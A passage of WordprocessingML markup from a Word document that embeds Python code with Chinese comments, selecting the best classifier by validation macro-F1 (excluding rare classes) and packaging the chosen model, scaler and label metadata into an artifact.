        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        val_metrics = evaluate(model, X_val, y_val, classes) if len(X_val) else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6981F908">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        test_metrics = evaluate(model, X_test, y_test, classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322D45E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        trees = count_trees(model)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644E4694">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if val_metrics is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527C548D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            score = selection_score(val_metrics)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB39519">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FDD76A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            score = cv_scores[name][0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC615EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        results[name] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A27A9BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "fit_seconds": round(fit_s, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6B19B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "tree_count": trees,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261772AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "val": val_metrics,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754F54FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "test": test_metrics,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76116525">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "selection_score": score,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6465AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "cv_folds": cv_scores[name][2] if name in cv_scores else None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB1CFD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151D83D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fitted[name] = model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADF5961">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        head = f"[训练] {name:&lt;15} {fit_s:6.1f}s  树 {trees:&lt;7} "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19986254">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if val_metrics is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD6C4FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            head += (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456CD695">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"val 可信macro-F1 {selection_score(val_metrics):.4f}  "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1425FEBB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"(含稀有类 {val_metrics['macro_f1']:.4f})  "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EC39CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398BE921">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0810969C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            head += f"滚动均值 {score:.4f}  "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0271B597">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(head + f"test 可信macro-F1 {test_metrics['macro_f1_reliable']:.4f}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C7D4EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        warn_rare_classes(test_metrics)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3890E317">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C6F06B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    best_name = max(results, key=lambda k: results[k]["selection_score"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1229C6C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    best_model = fitted[best_name]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B89FD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    excluded = sorted(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E46D435">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        {c for r in results.values() if r["val"] for c in r["val"]["excluded_from_reliable"]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6669459A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F00C406">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    basis = "滚动验证均值" if folds is not None else "验证集可信 macro-F1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5764EA5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D99D623">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"\n[选型] {best_name} 胜出（{basis}="</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF7510A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"{results[best_name]['selection_score']:.4f}）；测试集指标仅作最终汇报，不参与选择",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F1DBDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580A483B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AECA327">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if excluded:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657ED29B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015B532C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"[选型] 这些类测试/验证样本不足 {RARE_CLASS_SUPPORT} 个，未计入可信 macro-F1：{excluded}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6BF151">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC3CCD8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1AEC41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 真正的饱和信号是"第一名和第二名分不开"，不是全体极差</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB51341">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    note = saturation_note(results)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044061E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if note:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C7466C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[选型] 注意：{note}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F935A53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E62C5D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    artifact = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A960E14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "model": best_model,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F41C1AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "scaler": scaler,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1237B15A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "feature_names": feature_names,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBCC0F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "classes": classes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEF1458">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 推理侧约定：model.predict() 返回的是这里的下标，必须过 classes[pred] 才是类名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF42442">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "predict_returns": "class_index",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D2F8E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "label_map": LABEL_MAP,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6468D2DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
